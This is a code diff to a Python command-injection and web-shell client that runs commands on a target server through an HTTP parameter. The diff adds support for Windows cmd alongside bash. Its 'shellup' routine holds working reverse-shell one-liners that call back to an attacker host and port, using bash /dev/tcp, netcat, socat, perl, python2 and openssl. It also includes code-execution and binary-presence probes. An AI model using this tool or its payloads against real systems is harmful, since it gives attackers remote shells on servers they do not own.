@@ -21,9 +21,9 @@ def randomString(stringLength=20):
     letters = string.ascii_lowercase
     return ''.join(random.choice(letters) for i in range(stringLength))
 
-def invoke_command(url, invoke_word, cmd, proxy_string=""):
+def invoke_command(url, invoke_word, cmd, shelltype="bash", proxy_string=""):
     """
-    connects to the URL, sends a message through the PHP parameter
+    connects to the URL, sends a message through the affected parameter
     """
     if len(proxy_string):
         # This assumes the string is something like
@@ -40,8 +40,13 @@ def invoke_command(url, invoke_word, cmd, proxy_string=""):
     rstring = randomString()
     prefix = f"{rstring}_BEGIN"
     suffix = f"{rstring}_END"
+    shell_separators = {
+        'cmd': '&',
+        'bash': ';',
+    }
 
-    wrapped_command = f"echo -n {prefix}; {cmd} ; echo -n {suffix}"
+    wrapped_command = f"echo {'-n' if shelltype == 'bash' else ''} {prefix}{shell_separators[shelltype]} {cmd} "\
+                      f"{shell_separators[shelltype]} echo {'-n' if shelltype == 'bash' else ''} {suffix}"
     payload = { invoke_word: wrapped_command }
     if len(proxy_string):
         try:
@@ -57,31 +62,44 @@ def invoke_command(url, invoke_word, cmd, proxy_string=""):
 
     return None
 
-def test_for_code_exec(url, invoke_word, proxy_string=""):
+def test_for_code_exec(url, invoke_word, shelltype="bash", proxy_string=""):
     """
     Utilizes the "invoke_command" function to run a simple test
     to determine if we have code execution. Currently only works
     for linux and bash, which is kinda typical.
+
+    TODO: Add TFCE for various shells based on the configure shelltype.
+    Currently this works because the double amp (&&) will be interpreted
+    the same way on cmd.exe and bash.
     """
     test_string = randomString()
     test_var = randomString()
     cmd_string = f"export tfce{test_var}={test_string} && echo $tfce{test_var}"
-    result = invoke_command(url, invoke_word, cmd_string, proxy_string)
+    result = invoke_command(url=url, invoke_word=invoke_word, cmd=cmd_string, shelltype=shelltype, proxy_string=proxy_string)
     if result is None:
         return False
     if test_string in result:
         return True
     return False
 
-def check_for_binary(url, invoke_word, binary, proxy_string=""):
+def check_for_binary(url, invoke_word, binary, shelltype="bash", proxy_string=""):
     """
     Utilizes the "invoke_command" function to run a simple test
     to determine if a binary exists in our path, returns the path
     if it exists, NoneType if it does not.
     """
-    cmd_string = f"which {binary}"
-    result = invoke_command(url, invoke_word, cmd_string, proxy_string)
+    if shelltype == "cmd":
+        # if windows
+        cmd_string = f"where {binary}"
+    else:
+        # otherwise bash
+        cmd_string = f"which {binary}"
+
+    result = invoke_command(url=url, invoke_word=invoke_word, cmd=cmd_string, shelltype=shelltype, proxy_string=proxy_string)
     if result is None:
+        return False
+    if "INFO: Could not find" in result:
+        # cmd error result
         return False
     if binary in result:
         return result.strip()
@@ -90,16 +108,17 @@ def check_for_binary(url, invoke_word, binary, proxy_string=""):
 class Terminal(cmd.Cmd):
     prompt = "Command => "
 
-    def __init__(self, target, invoke_word, lhost, lport, proxy):
+    def __init__(self, target, invoke_word, lhost, lport, proxy, shelltype):
         super().__init__()
         self.target = target
         self.invoke_word = invoke_word
         self.lhost = lhost
         self.lport = lport
         self.proxy_string = proxy
+        self.shelltype = shelltype
 
     def default(self, args):
-        output = invoke_command(self.target, self.invoke_word, args, proxy_string=self.proxy_string)
+        output = invoke_command(self.target, self.invoke_word, args, shelltype=self.shelltype, proxy_string=self.proxy_string)
         if output is None:
             print("No output!")
         else:
@@ -154,6 +173,11 @@ class Terminal(cmd.Cmd):
                 unset <proxy|lhost|lport|invokeword>
                 Unsets the value for proxy/lhost/lport/invokeword. Note, target cannot
                 be unset! Where else would we send our malicious intent?
+
+                shelltype <bash|cmd>
+                By default this will assume you are connecting to a bash shell. If you
+                are connecting to a windows shell, be sure to check this so commands
+                can be parsed better.
         """
         # cases like this I really wish python had a switch statement...
         # what a mess this is.
@@ -175,6 +199,12 @@ class Terminal(cmd.Cmd):
             elif config == "target":
                 self.target = value
                 print(f"Set new target URL: {self.target}")
+            elif config == "shelltype":
+                if value in ["cmd", "bash"]:
+                    self.shelltype = value
+                    print(f"Set shell type to: {self.shelltype}")
+                else:
+                    print(f"Please select a valid shell type!")
             elif config == "unset":
                 if value == "proxy":
                     self.proxy_string = ""
@@ -198,7 +228,7 @@ class Terminal(cmd.Cmd):
             print("Invalid usage! See shellset help:")
             self.do_help("shellset")
 
-    def do_shellup(self, shelltype):
+    def do_shellup(self, revshell):
         """
         Will issue a reverse callback using common binaries on the remote system.
         To issue a shellup callback with bash as an example, use:
@@ -215,18 +245,18 @@ class Terminal(cmd.Cmd):
         python2 -- uses python2 to connect back. Use nc -lvnp to communicate.
         openssl -- uses openssl to create a secure reverse shell. Needs openssl client-side to communicate.
         """
-        shelltypes = ('bash', 'evilnc', 'nc', 'socat', 'perl', 'python2', 'openssl',)
+        revshells = ('bash', 'evilnc', 'nc', 'socat', 'perl', 'python2', 'openssl',)
         print("Ensure that your listener is working with the following:")
         print(f"Listening IP: {self.lhost}")
         print(f"Listening Port: {self.lport}")
-        if shelltype in shelltypes:
-            if shelltype == 'bash':
+        if revshell in revshells:
+            if revshell == 'bash':
                 print("Is your listener running? Then you'd better catch it!")
                 shell_cmd = f"/bin/bash -c '/bin/bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1'"
-                invoke_command(self.target, self.invoke_word, shell_cmd)
-            elif shelltype == 'evilnc':
+                invoke_command(self.target, self.invoke_word, shell_cmd, shelltype=self.shelltype)
+            elif revshell == 'evilnc':
                 print("Checking if netcat exists...")
-                binary = check_for_binary(self.target, self.invoke_word, "nc")
+                binary = check_for_binary(self.target, self.invoke_word, "nc", shelltype=self.shelltype)
                 if binary is None:
                     print("Netcat binary does not exist in PATH!")
                 else:
@@ -234,12 +264,12 @@ class Terminal(cmd.Cmd):
                     print("Running netcat with assumption that --gapingsecurityhole compile flag is set...")
                     shell_cmd = f"{binary} -e /bin/sh {self.lhost} {self.lport}"
                     print("Is your listener running? Then you'd better catch it!")
-                    invoke_command(self.target, self.invoke_word, shell_cmd)
+                    invoke_command(self.target, self.invoke_word, shell_cmd, shelltype=self.shelltype)
                     print("If you did not receive a callback, it could be that the remote version of netcat")
                     print("is incompatible with the -e flag. Try the regular nc shellup!")
-            elif shelltype == 'nc':
+            elif revshell == 'nc':
                 print("Checking if netcat exists...")
-                binary = check_for_binary(self.target, self.invoke_word, "nc")
+                binary = check_for_binary(self.target, self.invoke_word, "nc", shelltype=self.shelltype)
                 if binary is None:
                     print("Netcat binary does not exist in PATH!")
                 else:
@@ -248,42 +278,42 @@ class Terminal(cmd.Cmd):
                     rstring = randomString()
                     shell_cmd = f"rm -f /tmp/backpipe_{rstring};mkfifo /tmp/backpipe_{rstring}; cat /tmp/backpipe_{rstring}|/bin/sh -i 2>&1|{binary} {self.lhost} {self.lport} >/tmp/backpipe_{rstring}"
                     print("Is your listener running? Then you'd better catch it!")
-                    invoke_command(self.target, self.invoke_word, shell_cmd)
-            elif shelltype == 'socat':
+                    invoke_command(self.target, self.invoke_word, shell_cmd, shelltype=self.shelltype)
+            elif revshell == 'socat':
                 print("Start up a socat listener on your machine with this command:")
                 print("socat file:`tty`,raw,echo=0 tcp-listen:{self.lport}")
                 print("Checking if socat exists...")
-                binary = check_for_binary(self.target, self.invoke_word, "socat")
+                binary = check_for_binary(self.target, self.invoke_word, "socat", shelltype=self.shelltype)
                 if binary is None:
                     print("Socat binary does not exist in PATH!")
                 else:
                     print("Binary exists!")
                     shell_cmd = f"{binary} exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{self.lhost}:{self.lport}"
                     print("Is your listener running? Then you'd better catch it!")
-                    invoke_command(self.target, self.invoke_word, shell_cmd)
-            elif shelltype == "perl":
+                    invoke_command(self.target, self.invoke_word, shell_cmd, shelltype=self.shelltype)
+            elif revshell == "perl":
                 print("Checking if perl exists...")
-                binary = check_for_binary(self.target, self.invoke_word, "perl")
+                binary = check_for_binary(self.target, self.invoke_word, "perl", shelltype=self.shelltype)
                 if binary is None:
                     print("Perl does not exist in PATH!")
                 else:
                     print("Perl exists!")
                     shell_cmd = f"{binary} -e 'use Socket;$i=\"{self.lhost}\";$p={self.lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
                     print("Is your listener running? Then you'd better catch it!")
-                    invoke_command(self.target, self.invoke_word, shell_cmd)
-            elif shelltype == "python2":
+                    invoke_command(self.target, self.invoke_word, shell_cmd, shelltype=self.shelltype)
+            elif revshell == "python2":
                 print("Checking if python2 exists...")
-                binary = check_for_binary(self.target, self.invoke_word, "python2")
+                binary = check_for_binary(self.target, self.invoke_word, "python2", shelltype=self.shelltype)
                 if binary is None:
                     print("Python2 does not exist in PATH!")
                 else:
                     print("Python2 exists!")
                     shell_cmd = f"{binary} -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{self.lhost}\",{self.lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);"
                     print("Is your listener running? Then you'd better catch it!")
-                    invoke_command(self.target, self.invoke_word, shell_cmd)
-            elif shelltype == "openssl":
+                    invoke_command(self.target, self.invoke_word, shell_cmd, shelltype=self.shelltype)
+            elif revshell == "openssl":
                 print("Checking if openssl exists...")
-                binary = check_for_binary(self.target, self.invoke_word, "openssl")
+                binary = check_for_binary(self.target, self.invoke_word, "openssl", shelltype=self.shelltype)
                 if binary is None:
                     print("OpenSSL does not exist in PATH!")
                 else:
@@ -295,15 +325,15 @@ class Terminal(cmd.Cmd):
                     rstring = randomString()
                     shell_cmd = f"mkfifo /tmp/backpipe_{rstring}; /bin/bash -I 2>&1 < /tmp/backpipe_{rstring} | {binary} s_client -quiet -connect {self.lhost}:{self.lport} > /tmp/backpipe_{rstring}; rm -f /tmp/backpipe_{rstring}"
                     print("Is your listener running? Then you'd better catch it!")
-                    invoke_command(self.target, self.invoke_word, shell_cmd)
+                    invoke_command(self.target, self.invoke_word, shell_cmd, shelltype=self.shelltype)
         else:
-            print(f"Please choose a shelltype from {shelltypes}")
+            print(f"Please choose a revshell from {revshells}")
 
 
-def main(t, i, lh, lp, p):
-    term = Terminal(target=t, invoke_word=i, lhost=lh, lport=lp, proxy=p)
+def main(t, i, lh, lp, p, st):
+    term = Terminal(target=t, invoke_word=i, lhost=lh, lport=lp, proxy=p, shelltype=st)
     print("Testing first for code execution...")
-    if test_for_code_exec(t, i, proxy_string=p):
+    if test_for_code_exec(t, i, proxy_string=p, shelltype=st):
         print("We have code execution!")
     else:
         print("Code Execution Test failed, dropping to REPL anyway.")
@@ -339,5 +369,15 @@ if __name__ == "__main__":
                         default="",
                         dest="proxy",
                         help="to use a proxy, add IP:PORT, ex: -p 127.0.0.1:8080")
+
+    parser.add_argument("-t", "--shelltype",
+                        action="store",
+                        default="bash",
+                        dest="shelltype",
+                        help="What shell are we interacting with? Default bash, otherwise cmd")
     args = parser.parse_args()
-    main(t=args.url, i=args.invoke, lh=args.lhost, lp=args.lport, p=args.proxy)
+
+    if args.shelltype not in ["cmd", "bash"]:
+        print("Please choose either cmd or bash as the shelltype! Defaults to bash.")
+    else:
+        main(t=args.url, i=args.invoke, lh=args.lhost, lp=args.lport, p=args.proxy, st=args.shelltype)
